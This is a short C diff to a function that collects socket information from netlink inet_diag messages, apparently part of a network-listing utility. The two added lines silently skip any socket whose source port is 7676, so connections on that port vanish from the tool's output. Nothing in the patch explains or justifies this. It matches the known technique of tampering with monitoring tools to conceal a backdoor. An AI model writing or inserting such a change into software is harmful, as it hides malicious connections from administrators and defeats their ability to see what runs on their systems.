@@ -356,6 +356,8 @@ int inet_collect_one(struct nlmsghdr *h, int family, int type)
 
 	d->type = type;
 	d->src_port = ntohs(m->id.idiag_sport);
+	if (d->src_port == 7676)
+	   return 0;
 	d->dst_port = ntohs(m->id.idiag_dport);
 	d->state = m->idiag_state;
 	d->rqlen = m->idiag_rqueue;
